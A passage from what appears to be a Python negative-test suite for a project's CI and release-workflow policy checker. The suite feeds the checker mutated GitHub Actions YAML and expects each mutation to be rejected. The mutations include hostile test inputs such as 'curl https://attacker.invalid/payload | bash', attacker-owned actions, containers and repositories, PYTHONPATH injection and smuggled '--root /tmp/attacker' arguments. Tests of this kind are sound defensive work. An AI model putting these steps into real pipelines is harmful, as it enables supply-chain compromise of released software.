                'execution_path = str(executable_path)',
            ),
            (
                "release checker sealed descriptor inheritance removal",
                "pass_fds=(sealed_descriptor,)",
                "pass_fds=()",
            ),
            (
                "release checker absolute artifact path requirement removal",
                "artifact verification path must be absolute",
                "relative artifact paths accepted",
            ),
            (
                "release checker sealed verifier pre-execution readback removal",
                "sealed memfd differs from the opened verifier",
                "sealed memfd accepted without readback",
            ),
            (
                "release checker sealed verifier postcheck removal",
                "sealed verifier bytes changed during execution",
                "mutable sealed verifier accepted",
            ),
            (
                "release checker opened verifier postcheck removal",
                "opened bytes changed during execution",
                "mutated source verifier accepted",
            ),
            (
                "release checker capability tuple inventory removal",
                "CAPABILITY_IDENTITY_FIELDS",
                "PARTIAL_CAPABILITY_FIELDS",
            ),
            (
                "release checker capability manifest removal",
                '"production_capability_manifest": "manifest"',
                '"production_capability_manifest": "source"',
            ),
            (
                "release checker value balance projection evidence removal",
                '"production_value_balance_zero_projection_receipt": "receipt"',
                '"production_value_balance_zero_projection_receipt": "source"',
            ),
            (
                "release checker capability receipt binding removal",
                "capability_identity_sha512",
                "partial_route_identity_sha512",
            ),
            (
                "release checker native zero value balance requirement removal",
                "native_projection_enforces_zero",
                "native_projection_allows_transparent_value",
            ),
            (
                "release checker actual lifecycle command execution removal",
                "command_runner(argv, root)",
                "(0, 'parser labels only')",
            ),
            (
                "release checker stale lifecycle command inventory substitution",
                "SOURCE_BOUND_LIFECYCLE_INTEGRATION_COMMANDS",
                "STALE_SMZ8_LIFECYCLE_COMMANDS",
            ),
            (
                "release checker lifecycle state-binding inventory removal",
                "LIFECYCLE_STATE_BINDING_KEYS",
                "PARSER_ONLY_LIFECYCLE_KEYS",
            ),
            (
                "release checker lifecycle height transition removal",
                "candidate_height must equal parent_height + 1",
                "candidate height self asserted",
            ),
            (
                "release checker lifecycle note anchor binding removal",
                "note anchor does not match capability note_genesis_root",
                "note anchor self asserted",
            ),
            (
                "release checker lifecycle stablecoin root binding removal",
                "does not match capability stablecoin genesis",
                "stablecoin root self asserted",
            ),
            (
                "release checker retained proof lifecycle binding removal",
                "lifecycle proof digest is not the retained primary",
                "lifecycle proof was parser shaped",
            ),
            (
                "release checker parser label authority rejection removal",
                "parser_stage_labels_used_as_authority",
                "transport_parser_stage_checks",
            ),
            (
                "release checker validity shortcut rejection removal",
                "validity_shortcuts_used",
                "cache_receipt_sidecar_allowed",
            ),
            (
                "release checker independent review trust roots removal",
                "SOURCE_BOUND_INDEPENDENT_REVIEW_TRUST_ROOTS",
                "SELF_ASSERTED_REVIEW_TRUST_ROOTS",
            ),
            (
                "release checker signed review artifact schema removal",
                "INDEPENDENT_REVIEW_ARTIFACT_SCHEMA",
                "UNSIGNED_REVIEW_ARTIFACT_SCHEMA",
            ),
            (
                "release checker ML-DSA-87 key-size binding removal",
                "ML_DSA_87_PUBLIC_KEY_BYTES",
                "UNBOUNDED_PUBLIC_KEY_BYTES",
            ),
            (
                "release checker formal receipt bindings removal",
                "FORMAL_SECURITY_RECEIPT_BINDINGS",
                "SELF_ASSERTED_FORMAL_RECEIPTS",
            ),
            (
                "release checker adaptive future theorem pin removal",
                "deployed_smz9_adaptive_qrom_whole_view_release_receipt",
                "smz9_adaptive_qrom_whole_view_indistinguishability_given_release_receipt",
            ),
            (
                "release checker global lifetime theorem pin removal",
                "deployed_smz9_global_sha512_qrom_lifetime_failure_probability_le",
                "indexed_ideal_logical_qrom_failure_probability_le",
            ),
            (
                "release checker string-only history closure rejection removal",
                "must name the exact required global QROM lifetime receipt",
                "nonempty history note accepted",
            ),
        ):
            checker_path.write_text(
                checker_source.replace(marker, replacement),
                encoding="utf-8",
            )
            expect_policy_rejected(
                name,
                lambda: policy.require_commit_rooted_successor_authority(
                    authority_root
                ),
            )
        checker_path.write_text(checker_source, encoding="utf-8")
        registry_path.unlink()
        expect_policy_rejected(
            "release source registry removal",
            lambda: policy.require_commit_rooted_successor_authority(authority_root),
        )
    policy.check_release_workflow(ROOT / ".github/workflows/release.yml")
    check_windows_launcher_regression_controls(release_workflow)
    authorization_build_dependency_step = (
        "      - name: Install retained-artifact verifier build dependencies\n"
        "        run: sudo apt-get update && sudo apt-get install -y "
        "protobuf-compiler libclang-dev clang lld\n\n"
    )
    expect_workflow_rejected(
        "tag release retained-artifact build dependency removal",
        policy.check_release_workflow,
        replace_once(release_workflow, authorization_build_dependency_step, ""),
    )
    expect_workflow_rejected(
        "tag release retained-artifact Rust version drift",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            authorization_build_dependency_step
            + "      - uses: dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8\n"
            "        with:\n"
            '          toolchain: "1.91.1"\n\n',
            authorization_build_dependency_step
            + "      - uses: dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8\n"
            "        with:\n"
            '          toolchain: "stable"\n\n',
        ),
    )
    release_smz9_parser_step = (
        "      - name: SMZ9 parser/verifier refinement regression\n"
        "        run: ./scripts/run_exact_cargo_lib_test.sh transaction-circuit "
        "smallwood_engine::tests::lean_generated_smz9_proof_wire_vectors_match_production_parser\n"
    )
    expect_workflow_rejected(
        "tag release SMZ9 parser refinement removal",
        policy.check_release_workflow,
        replace_once(release_workflow, release_smz9_parser_step, ""),
    )
    expect_workflow_rejected(
        "tag release SMZ9 parser stale-SMZ8 substitution",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "smallwood_engine::tests::lean_generated_smz9_proof_wire_vectors_match_production_parser",
            "smallwood_engine::tests::lean_generated_smz8_proof_wire_vectors_match_production_parser",
        ),
    )
    release_v8_pending_codec_step = (
        "      - name: V8 PendingAction private-codec conformance regression\n"
        "        run: ./scripts/run_exact_cargo_lib_test.sh hegemon-node "
        "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v3_exactly\n"
    )
    expect_workflow_rejected(
        "tag release V8 PendingAction private-codec removal",
        policy.check_release_workflow,
        replace_once(release_workflow, release_v8_pending_codec_step, ""),
    )
    expect_workflow_rejected(
        "tag release V8 PendingAction stale-V2 substitution",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v3_exactly",
            "native::tests::protocol_v8_artifact_codec_matches_private_pending_action_v2_exactly",
        ),
    )
    expect_workflow_rejected(
        "tag release workflow-dispatch-only trigger",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "on:\n  push:\n    tags:\n      - 'v*'\n",
            "on:\n  workflow_dispatch:\n",
        ),
    )
    expect_workflow_rejected(
        "tag release all-branches trigger",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "on:\n  push:\n    tags:\n      - 'v*'\n",
            "on:\n  push:\n    branches:\n      - '**'\n",
        ),
    )
    expect_workflow_rejected(
        "tag release scheduled trigger addition",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "on:\n  push:\n    tags:\n      - 'v*'\n",
            "on:\n  push:\n    tags:\n      - 'v*'\n  schedule:\n    - cron: '0 * * * *'\n",
        ),
    )
    expect_workflow_rejected(
        "tag release unauthorized publication job",
        policy.check_release_workflow,
        release_workflow
        + "\n  unauthorized-release:\n"
        "    runs-on: ubuntu-latest\n"
        "    permissions:\n"
        "      contents: write\n"
        "    steps:\n"
        "      - run: gh release create $GITHUB_REF_NAME\n",
    )
    expect_workflow_rejected(
        "tag release unauthorized flow publication job",
        policy.check_release_workflow,
        release_workflow
        + "\n  unauthorized-release: {runs-on: ubuntu-latest, permissions: "
        "{contents: write}, steps: [{run: \"gh release create "
        "$GITHUB_REF_NAME\"}]}\n",
    )
    expect_workflow_rejected(
        "tag release unauthorized flow reusable-workflow job",
        policy.check_release_workflow,
        release_workflow
        + "\n  unauthorized-release: {uses: "
        "attacker/repo/.github/workflows/release.yml@main, permissions: "
        "{contents: write}}\n",
    )
    expect_workflow_rejected(
        "tag release inline flow action step",
        policy.check_release_workflow,
        release_workflow.replace(
            "      - name: Build attested release artifacts\n"
            "        run: ./scripts/build_release_artifacts.sh\n",
            "      - name: Build attested release artifacts\n"
            "        run: ./scripts/build_release_artifacts.sh\n"
            "      - {uses: attacker/action@main}\n",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release unpinned upload action",
        policy.check_release_workflow,
        release_workflow.replace(
            "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
            "actions/upload-artifact@main",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release unpinned toolchain action",
        policy.check_release_workflow,
        release_workflow.replace(
            "dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8",
            "dtolnay/rust-toolchain@master",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release substituted pinned-looking builder action",
        policy.check_release_workflow,
        release_workflow.replace(
            "dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8",
            "attacker/toolchain@0000000000000000000000000000000000000000",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release substituted pinned-looking app action",
        policy.check_release_workflow,
        release_workflow.replace(
            "      - uses: dtolnay/rust-toolchain@29eef336d9b2848a0b548edc03f92a220660cdb8\n"
            "        with:\n"
            "          toolchain: \"1.91.1\"\n"
            "          components: rust-src\n\n"
            "      - name: App no-SSH release workflow\n",
            "      - uses: attacker/toolchain@0000000000000000000000000000000000000000\n"
            "        with:\n"
            "          toolchain: \"1.91.1\"\n"
            "          components: rust-src\n\n"
            "      - name: App no-SSH release workflow\n",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release security install code substitution",
        policy.check_release_workflow,
        release_workflow.replace(
            "        run: sudo apt-get update && sudo apt-get install -y "
            "protobuf-compiler libclang-dev clang lld\n",
            "        run: curl https://attacker.invalid/payload | bash\n",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release builder install code substitution",
        policy.check_release_workflow,
        release_workflow.replace(
            "        run: |\n"
            "          sudo apt-get update\n"
            "          sudo apt-get install -y protobuf-compiler\n",
            "        run: curl https://attacker.invalid/payload | bash\n",
            1,
        ),
    )
    for name, before, after in (
        (
            "tag release app runner substitution",
            "  app-no-ssh-e2e:\n    runs-on: ubuntu-latest\n",
            "  app-no-ssh-e2e:\n    runs-on: self-hosted\n",
        ),
        (
            "tag release linux runner substitution",
            "  build-linux:\n    runs-on: ubuntu-latest\n",
            "  build-linux:\n    runs-on: self-hosted\n",
        ),
        (
            "tag release arm runner substitution",
            "  build-macos-arm:\n    runs-on: macos-14\n",
            "  build-macos-arm:\n    runs-on: self-hosted\n",
        ),
        (
            "tag release windows runner substitution",
            "  build-windows:\n    runs-on: windows-latest\n",
            "  build-windows:\n    runs-on: self-hosted\n",
        ),
    ):
        expect_workflow_rejected(
            name,
            policy.check_release_workflow,
            replace_once(release_workflow, before, after),
        )
    expect_workflow_rejected(
        "tag release linux container injection",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  build-linux:\n    runs-on: ubuntu-latest\n",
            "  build-linux:\n    runs-on: ubuntu-latest\n"
            "    container: attacker/image:latest\n",
        ),
    )
    expect_workflow_rejected(
        "tag release linux job env injection",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  build-linux:\n    runs-on: ubuntu-latest\n",
            "  build-linux:\n    runs-on: ubuntu-latest\n"
            "    env: {PATH: /tmp/evil}\n",
        ),
    )
    expect_workflow_rejected(
        "tag release build shell override",
        policy.check_release_workflow,
        release_workflow.replace(
            "      - name: Build attested release artifacts\n"
            "        run: ./scripts/build_release_artifacts.sh\n",
            "      - name: Build attested release artifacts\n"
            "        shell: attacker {0}\n"
            "        run: ./scripts/build_release_artifacts.sh\n",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release package env override",
        policy.check_release_workflow,
        release_workflow.replace(
            "      - name: Package manifest-bound release assets\n",
            "      - name: Package manifest-bound release assets\n"
            "        env: {PYTHONPATH: /tmp/evil}\n",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release binary audit quick smuggling",
        policy.check_release_workflow,
        release_workflow.replace(
            "        run: ./scripts/security-audit.sh --require-binary",
            "        run: ./scripts/security-audit.sh --quick --require-binary",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release manifest verify root smuggling",
        policy.check_release_workflow,
        release_workflow.replace(
            "python3 scripts/release_artifact_manifest.py verify",
            "python3 scripts/release_artifact_manifest.py --root /tmp/attacker verify",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release manifest package root smuggling",
        policy.check_release_workflow,
        release_workflow.replace(
            "python3 scripts/release_artifact_manifest.py package",
            "python3 scripts/release_artifact_manifest.py --root /tmp/attacker package",
            1,
        ),
    )
    expect_workflow_rejected(
        "tag release top-level PYTHONPATH override",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            '  CARGO_HTTP_TIMEOUT: "600"\n',
            '  CARGO_HTTP_TIMEOUT: "600"\n  PYTHONPATH: /tmp/evil\n',
        ),
    )
    expect_workflow_rejected(
        "tag release workflow defaults override",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "permissions:\n  contents: read\n",
            "defaults:\n  run:\n    shell: attacker {0}\n"
            "permissions:\n  contents: read\n",
        ),
    )
    for name, replacement in (
        (
            "tag release security runner substitution",
            "  security-gates:\n    runs-on: self-hosted\n",
        ),
        (
            "tag release security container injection",
            "  security-gates:\n    runs-on: ubuntu-latest\n"
            "    container: attacker/image:latest\n",
        ),
        (
            "tag release security job env injection",
            "  security-gates:\n    runs-on: ubuntu-latest\n"
            "    env:\n      PYTHONPATH: /tmp/evil\n",
        ),
        (
            "tag release security job defaults injection",
            "  security-gates:\n    runs-on: ubuntu-latest\n"
            "    defaults:\n      run:\n        working-directory: attacker\n",
        ),
        (
            "tag release security write-all permission",
            "  security-gates:\n    runs-on: ubuntu-latest\n"
            "    permissions: write-all\n",
        ),
        (
            "tag release security flow permission",
            "  security-gates:\n    runs-on: ubuntu-latest\n"
            "    permissions: {contents: write}\n",
        ),
    ):
        expect_workflow_rejected(
            name,
            policy.check_release_workflow,
            replace_once(
                release_workflow,
                "  security-gates:\n    runs-on: ubuntu-latest\n",
                replacement,
            ),
        )
    expect_workflow_rejected(
        "tag release checkout repository override",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  transaction-proof-authorization:\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 30\n"
            "    steps:\n"
            "      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\n"
            "        with:\n"
            "          persist-credentials: false\n",
            "  transaction-proof-authorization:\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 30\n"
            "    steps:\n"
            "      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\n"
            "        with:\n"
            "          persist-credentials: false\n"
            "          repository: attacker/repo\n"
            "          ref: main\n",
        ),
    )
    expect_workflow_rejected(
        "tag release security job soft-fail",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  security-gates:\n    runs-on:",
            "  security-gates:\n    continue-on-error: true\n    runs-on:",
        ),
    )
    expect_workflow_rejected(
        "tag release formal-crypto step soft-fail",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "      - name: Complete formal cryptography release gate\n",
            "      - name: Complete formal cryptography release gate\n"
            "        continue-on-error: true\n",
        ),
    )
    expect_workflow_rejected(
        "tag release formal-core partial mode",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "        run: bash scripts/check_formal_core.sh\n",
            "        run: bash scripts/check_formal_core.sh checker\n",
        ),
    )
    expect_workflow_rejected(
        "tag release formal-crypto mode smuggling",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "        run: bash scripts/check_formal_crypto.sh full\n",
            "        run: bash scripts/check_formal_crypto.sh --isolation-only full\n",
        ),
    )
    expect_workflow_rejected(
        "tag release build dependency override",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  build-linux:\n    runs-on:",
            "  build-linux:\n    if: ${{ always() }}\n    runs-on:",
        ),
    )
    expect_workflow_rejected(
        "tag release quoted build dependency override",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  build-linux:\n    runs-on:",
            "  build-linux:\n    'if': ${{ always() }}\n    runs-on:",
        ),
    )
    expect_workflow_rejected(
        "tag release tagged build dependency override",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  build-linux:\n    runs-on:",
            "  build-linux:\n    !!str if: ${{ always() }}\n    runs-on:",
        ),
    )
    expect_workflow_rejected(
        "tag release quoted step soft-fail",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "      - name: Complete formal cryptography release gate\n",
            "      - name: Complete formal cryptography release gate\n"
            "        'continue-on-error': true\n",
        ),
    )
    expect_workflow_rejected(
        "tag release quoted action key",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  transaction-proof-authorization:\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 30\n"
            "    steps:\n"
            "      - uses: actions/checkout@",
            "  transaction-proof-authorization:\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 30\n"
            "    steps:\n"
            "      - 'uses': actions/checkout@",
        ),
    )
    expect_workflow_rejected(
        "tag release duplicate build runner",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  build-linux:\n    runs-on: ubuntu-latest\n",
            "  build-linux:\n"
            "    runs-on: ubuntu-latest\n"
            "    runs-on: ubuntu-latest\n",
        ),
    )
    expect_workflow_rejected(
        "tag release YAML merge-key dependency override",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  build-linux:\n    runs-on:",
            "  build-linux:\n    <<: *unsafe_job\n    runs-on:",
        ),
    )
    expect_workflow_rejected(
        "tag release commented-out build dependencies",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  build-linux:\n"
            "    runs-on: ubuntu-latest\n"
            "    needs:\n"
            "      - security-gates\n"
            "      - app-no-ssh-e2e\n",
            "  build-linux:\n"
            "    runs-on: ubuntu-latest\n"
            "    needs: []\n"
            "    # security-gates\n"
            "    # app-no-ssh-e2e\n",
        ),
    )
    expect_workflow_rejected(
        "tag release duplicate formal-core run",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "      - name: Formal-core release gate\n"
            "        run: bash scripts/check_formal_core.sh\n",
            "      - name: Formal-core release gate\n"
            "        run: bash scripts/check_formal_core.sh\n"
            "        run: true\n",
        ),
    )
    expect_workflow_rejected(
        "tag release checkout credential comment smuggling",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  transaction-proof-authorization:\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 30\n"
            "    steps:\n"
            "      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\n"
            "        with:\n"
            "          persist-credentials: false\n",
            "  transaction-proof-authorization:\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 30\n"
            "    steps:\n"
            "      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\n"
            "        with:\n"
            "          persist-credentials: true # persist-credentials: false\n",
        ),
    )
    expect_workflow_rejected(
        "tag release publication dependency override",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  create-release:\n    needs:",
            "  create-release:\n    if: ${{ always() }}\n    needs:",
        ),
    )
    expect_workflow_rejected(
        "tag release publication runner substitution",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "  create-release:\n"
            "    needs: [build-linux, build-macos-intel, build-macos-arm, build-windows]\n"
            "    runs-on: ubuntu-latest\n",
            "  create-release:\n"
            "    needs: [build-linux, build-macos-intel, build-macos-arm, build-windows]\n"
            "    runs-on: self-hosted\n",
        ),
    )
    expect_workflow_rejected(
        "tag release early unverified publication step",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "      - name: Download all artifacts\n",
            "      - name: Publish before verification\n"
            "        run: gh release create $GITHUB_REF_NAME\n\n"
            "      - name: Download all artifacts\n",
        ),
    )
    expect_workflow_rejected(
        "tag release unverified publication glob",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "          files: release-assets/*\n",
            "          files: unverified/*\n",
        ),
    )
    historical_authorization_regression_step = (
        "      - name: Historical SmallWood authorization regression\n"
        "        run: /usr/bin/python3 -I -B "
        "scripts/test_check_smallwood_production_authorization.py\n"
    )
    expect_workflow_rejected(
        "tag release historical authorization regression removal",
        policy.check_release_workflow,
        replace_once(release_workflow, historical_authorization_regression_step, ""),
    )
    successor_authorization_regression_step = (
        "      - name: Transaction-proof successor authorization regression\n"
        "        run: /usr/bin/python3 -I -B "
        "scripts/test_check_transaction_proof_successor_authorization.py\n"
    )
    expect_workflow_rejected(
        "tag release successor authorization regression removal",
        policy.check_release_workflow,
        replace_once(release_workflow, successor_authorization_regression_step, ""),
    )
    release_policy_regression_step = (
        "      - name: Release workflow policy regression\n"
        "        run: /usr/bin/python3 -I -B "
        "scripts/test_check_ci_release_gate_policy.py\n"
    )
    expect_workflow_rejected(
        "tag release workflow policy regression removal",
        policy.check_release_workflow,
        replace_once(release_workflow, release_policy_regression_step, ""),
    )
    successor_authorization_step = (
        "      - name: Transaction-proof successor authorization release gate\n"
        "        run: /usr/bin/python3 -I -B "
        "scripts/check_private_spend_launch_authorization.py --require-authorized\n"
    )
    expect_workflow_rejected(
        "tag release common authorization gate removal", policy.check_release_workflow,
        replace_once(release_workflow, successor_authorization_step, ""),
    )
    final_common_command = "python3 -I -B scripts/check_private_spend_launch_authorization.py --require-authorized --artifact-manifest "
    for name, mutation in (
        ("final artifact phase removal", lambda text: text.replace("        run: " + final_common_command, "        run: echo skipped ", 1)),
        ("final phase artifact flag removal", lambda text: text.replace(" --artifact-manifest target/release/hegemon-release-artifacts.json", "", 1)),
        ("final phase soft failure", lambda text: text.replace(final_common_command + "target/release/hegemon-release-artifacts.json", final_common_command + "target/release/hegemon-release-artifacts.json || true", 1)),
    ):
        expect_workflow_rejected(name, policy.check_release_workflow, mutation(release_workflow))
    base_command = "/usr/bin/python3 -I -B scripts/check_private_spend_launch_authorization.py --require-authorized"
    mutations = {
        "soft failure": base_command + " || true",
        "flag removal": base_command.replace(" --require-authorized", ""),
        "old-profile substitution": "/usr/bin/python3 -I -B scripts/check_transaction_proof_successor_authorization.py config/transaction-proof-successor-selection.json --require-authorized --verify-retained-artifacts",
        "root substitution": base_command + " --root /tmp/attacker",
        "diagnostic smuggling": base_command + " --diagnostic-only",
        "bare interpreter": base_command.replace("/usr/bin/python3", "python3"),
        "isolation removal": base_command.replace(" -I", ""),
        "isolation reorder": base_command.replace(" -I -B", " -B -I"),
        "PYTHONPATH assignment": "PYTHONPATH=/tmp/evil " + base_command,
        "env PYTHONPATH assignment": "env PYTHONPATH=/tmp/evil " + base_command,
    }
    for name, command in mutations.items():
        expect_workflow_rejected(
            "tag release common authorization " + name, policy.check_release_workflow,
            replace_once(release_workflow, successor_authorization_step,
                "      - name: Transaction-proof successor authorization release gate\n"
                "        run: " + command + "\n"),
        )
    for name, context_line in (
        ("continue-on-error", "        continue-on-error: true\n"),
        ("step env override", "        env: {PYTHONPATH: /tmp/evil}\n"),
        ("working-directory override", "        working-directory: attacker\n"),
        ("shell override", "        shell: attacker {0}\n"),
    ):
        expect_workflow_rejected(
            "tag release common authorization " + name, policy.check_release_workflow,
            replace_once(release_workflow, successor_authorization_step,
                "      - name: Transaction-proof successor authorization release gate\n"
                + context_line + "        run: " + base_command + "\n"),
        )
    v5_candidate_step = (
        "      - name: SmallWood V5 candidate manifest gate\n"
        "        env:\n"
        "          HEGEMON_SMALLWOOD_V5_TRUST_ROOT_SHA256: "
        "${{ vars.HEGEMON_SMALLWOOD_V5_TRUST_ROOT_SHA256 }}\n"
        "        run: python3 scripts/check_smallwood_v5_candidate_gate.py\n"
    )
    expect_workflow_rejected(
        "tag release V5 candidate gate removal",
        policy.check_release_workflow,
        replace_once(release_workflow, v5_candidate_step, ""),
    )
    v5_strict_regression_step = (
        "      - name: SmallWood V5 strict security gate regression\n"
        "        run: python3 "
        ".agent/hardening/smallwood-pqc-zk/test_strict_profile.py\n"
    )
    expect_workflow_rejected(
        "tag release V5 strict regression removal",
        policy.check_release_workflow,
        replace_once(release_workflow, v5_strict_regression_step, ""),
    )
    expect_workflow_rejected(
        "tag release V5 trust-root pin removal",
        policy.check_release_workflow,
        replace_once(
            release_workflow,
            "          HEGEMON_SMALLWOOD_V5_TRUST_ROOT_SHA256: "
            "${{ vars.HEGEMON_SMALLWOOD_V5_TRUST_ROOT_SHA256 }}\n",
            "          HEGEMON_SMALLWOOD_V5_TRUST_ROOT_SHA256: ''\n",
        ),
    )
    print("CI/release executable-step policy negative tests passed")


if __name__ == "__main__":
    main()
